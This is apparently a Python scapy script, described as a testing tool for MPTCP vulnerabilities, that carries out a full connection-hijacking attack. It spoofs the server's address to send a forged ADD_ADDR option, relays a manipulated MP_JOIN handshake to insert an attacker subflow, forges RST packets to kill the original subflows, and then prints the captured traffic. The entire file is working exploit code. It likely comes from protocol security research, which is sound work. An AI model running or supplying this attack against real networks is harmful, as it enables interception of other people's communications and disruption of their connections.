#Author: fabriziodemaria

import logging
import threading
import sys
from random import randint
from sniff_script import *

logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
from netaddr import *


ADDRESS_ID = 6 # Any number that is not taken by the other subflows should work
SYN_TRANSMITTED = 1 # Keep this set to one, thus sending a single MP_JOIN SYN packet to the server
THREAD_SYNC_TIME = 1 # Needed to let threads and tcpdump start properly before sending packets and capturing the answer
SEQUENCE_OFFSET = 1000 # TODO Analyze this value used to manipulate ACK/SEQ numbers for the connection
CAPTURING_TIMEOUT = 60 # How long the attacking script will capture the conversation before quitting

class SYNThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, clientIf):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.clientIf = clientIf
    def run(self):
        self.pkt = get_SYN(self.clientIf)


class SYNACKThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, serverIf, serverIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.serverIf = serverIf
        self.serverIP = serverIP
    def run(self):
        self.pkt = get_SYNACK(self.serverIf, self.serverIP)


class ACKThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, clientIf, myIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.clientIf = clientIf
        self.myIP = myIP
    def run(self):
        self.pkt = get_ACK(self.clientIf, self.myIP)


def get_ACK(clientIf, myIP):
    # print "Start looking for ACK"
    pkt = get_MPTCP_ack(clientIf, myIP)
    return pkt


def get_SYNACK(serverIf, serverIP):
    # print "Start looking for SYNACK"
    pkt = get_MPTCP_synack(serverIf, serverIP)
    return pkt


def get_SYN(clientIf):
    # print "Start looking for SYN"
    pkt = get_MPTCP_syn(clientIf)
    return pkt


def modify_addr_id(pkt, aid):
    """
    This method would manipulate the Address ID value in a MP_JOIN MPTCP packet
    """
    rcv = 0x00000000
    snd = 0x00000000
    bkp = 0L
    modified_options = []
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "MP_JOIN":
                    rcv = o.rcv_token
                    snd = o.snd_nonce
                    bkp = o.backup_flow
                    modified_options.append(TCPOption_MP(mptcp=MPTCP_JoinSYN(
                                        addr_id=aid,
                                        backup_flow=bkp,
                                        rcv_token=rcv,
                                        snd_nonce=snd)))
        else:
            modified_options.append(opt)
    pkt[TCP].options = modified_options
    return pkt


def filter_source(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        if str == srcIP:
            return True
    return False


def get_DSS_Ack(pkt):
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "DSS":
                    if hasattr(o, 'dsn'):
                        return o.dsn
    # Handled in main when no dsn is found
    return -1


def send_your_data():
    # TODO Implement this
    pass


def forge_addaddr(myIP, srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    pkt = (IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="A",seq=sniffedSeq,ack=sniffedAck,\
                 options=[TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID,\
                                                           adv_addr=myIP))]))
    return pkt


def forge_rst(srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    pkt = (IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="R",seq=sniffedSeq,ack=0))
    return pkt


def manipulate_ack(pkt, myIP, serverIP):
    # Modify SYNACK from server
    pkt[IP].dst = serverIP
    pkt[IP].src = myIP

    # Ethernet src/dst has to be updated in the forward phase
    del pkt[Ether].src
    del pkt[Ether].dst

    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt


def manipulate_synack(pkt, myIP, clientIP, clientPort):
    # Modify SYNACK from server
    pkt[IP].dst = clientIP
    pkt[IP].src = myIP
    pkt[TCP].dport = clientPort

    # Ethernet src/dst has to be updated in the forward phase
    del pkt[Ether].src
    del pkt[Ether].dst

    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt


def manipulate_syn(pkt, myIP, serverIP):
    # Modify SYN from Client
    pkt[IP].dst = serverIP
    pkt[IP].src = myIP
    pkt = modify_addr_id(pkt, ADDRESS_ID) # Might be not necessary

    # Ethernet src/dst has to be updated in the forward phase
    del pkt[Ether].src
    del pkt[Ether].dst

    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum

    pkt[TCP].ack += SEQUENCE_OFFSET
    # Genereting the list
    listp = []
    for i in range(0, SYN_TRANSMITTED):
        # pkt[TCP].sport += randint(10,500)
        listp.append(pkt.copy())
    return listp


def handle_payload(p, SERVER_IF, MY_IP):
    # Only read incoming packets (simulating off-path attack)
    if p.haslayer(IP) and p.haslayer(TCP) and p[IP].dst != MY_IP:
        return
    # Dirty passage, just avoid packets without MPTCP - DATA DSN
    if p.haslayer(TCP):
        dsa = get_DSS_Ack(p)
        if dsa == -1:
            return
        # Print the redirected traffic!
        if p.haslayer(Raw):
            print "Captured: \"" + p[Raw].load[:-1] + "\""
            # Generate data_ack for the server in order to keep receiving the next messages
            length = len(p[Raw].load)
            pkt = (IP(version=4L,src=p[IP].dst,dst=p[IP].src)/                          \
                     TCP(sport=p[TCP].dport, dport=p[TCP].sport, flags="A",             \
                     seq=p[TCP].ack, ack=(p[TCP].seq + length), options=[TCPOption_MP(  \
                     mptcp=MPTCP_DSS_Ack(data_ack=(dsa + length)))]))
            send(pkt, iface=SERVER_IF, verbose=0)


def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Testing tool for MPTCP vulnerabilities. Requires root privileges for scapy.')
    parser.add_argument('myIP', action='store', help='My IP address')
    parser.add_argument('serverIP', action='store', help='Server IP address')
    parser.add_argument('clientIP', action='store', help='Client IP address')
    parser.add_argument('serverIf', action='store', help='Interface name to server')
    parser.add_argument('clientIf', action='store', help='Interface name to client')
    if len(sys.argv)!=6:
        parser.print_help()
        sys.exit(1)
    return parser.parse_args()


def main():
    args = parse_args()

    MY_IP = args.myIP
    CLIENT_IP = args.clientIP
    SERVER_IP = args.serverIP
    CLIENT_IF = args.clientIf
    SERVER_IF = args.serverIf

    # Important step to maintain TCP conenction during slow packet forging process
    disable_RST()

    # Start waiting for SYN from client
    thread1 = SYNThread(1, "Syn capturing thread", 1, CLIENT_IF)
    thread1.start()
    time.sleep(THREAD_SYNC_TIME) # Give time to thread1 to start tcpdumping

    pktl = sniff(iface=CLIENT_IF, lfilter=lambda p: filter_source(p, CLIENT_IP), count=1)

    SERVER_PORT = pktl[0][TCP].dport

    # Sending ADD_ADDR to client
    print "[10%] Sending ADD_ADDR to client"
    send(forge_addaddr(MY_IP, SERVER_IP, pktl[0][TCP].dport, CLIENT_IP, pktl[0][TCP].sport, (pktl[0][TCP].ack)+SEQUENCE_OFFSET, (pktl[0][TCP].seq)-SEQUENCE_OFFSET), iface=CLIENT_IF, verbose=0)

    thread1.join() # This should contain the received SYN from the client
    print "[20%] Phase 1 - Received SYN from client"

    # Start waiting for SYNACK from server and the next ACK from the client now
    thread2 = SYNACKThread(1, "SynAck capturing thread", 1, SERVER_IF, SERVER_IP)
    thread2.start()
    thread3 = ACKThread(1, "Ack capturing thread", 1, CLIENT_IF, MY_IP)
    thread3.start()
    time.sleep(THREAD_SYNC_TIME) # Give time to thread2 and thread3 to start tcpdumping

    # Sending SYN to server. Also needed Ethernet information from previous stage just to avoid sniffing again
    listp = manipulate_syn(thread1.pkt.copy(), MY_IP, SERVER_IP)
    print "[30%] Sending SYN to server"
    sendp(listp, iface=SERVER_IF, verbose=0)

    thread2.join() # This should contain the received SYNACK from the server
    print "[40%] Phase 2 - Received SYNACK from server"

    # Sending SYNACK to the client
    pkt = manipulate_synack(thread2.pkt, MY_IP, CLIENT_IP, thread1.pkt[TCP].sport)
    print "[50%] Sending SYNACK to client"
    sendp(pkt.copy(), iface=CLIENT_IF, verbose=0)

    thread3.join() # This should contain the received ACK from the client
    print "[60%] Phase 3 - Received ACK from the client"

    # Sending ACK to the server
    pkt = manipulate_ack(thread3.pkt.copy(), MY_IP, SERVER_IP)
    print "[70%] Sending ACK to server"
    sendp(pkt.copy(), iface=SERVER_IF, verbose=0)

    print "[80%] Phase 4 - Subflow properly instantiated"

    # Now we want to RST the other subflow
    enable_RST()

    # These packets we sniff to gather the SEQ/ACK numbers for the RST packets
    pktl = sniff(iface=CLIENT_IF, lfilter=lambda p: filter_source(p, SERVER_IP), count=1)
    pktl2 = sniff(iface=SERVER_IF, lfilter=lambda p: filter_source(p, CLIENT_IP), count=1)

    print "[90%] Phase 5 - Resetting other subflows"
    r1 = forge_rst(SERVER_IP, pktl[0][TCP].sport, CLIENT_IP, pktl[0][TCP].dport, (pktl[0][TCP].seq), (pktl[0][TCP].ack)+1)
    send(r1, iface=CLIENT_IF, verbose=0)
    r2 = forge_rst(CLIENT_IP, pktl2[0][TCP].sport, SERVER_IP, pktl2[0][TCP].dport, (pktl2[0][TCP].seq), (pktl2[0][TCP].ack)+1)
    send(r2, iface=CLIENT_IF, verbose=0)

    disable_RST()
    print "[100%] Success, connession hijacked!"

    # Start printing the redirected traffic for CAPTURING_TIMEOUT seconds
    sniff(iface=SERVER_IF, prn=lambda p: handle_payload(p, SERVER_IF, MY_IP), timeout=CAPTURING_TIMEOUT)

    return

if __name__ == "__main__":
    main()
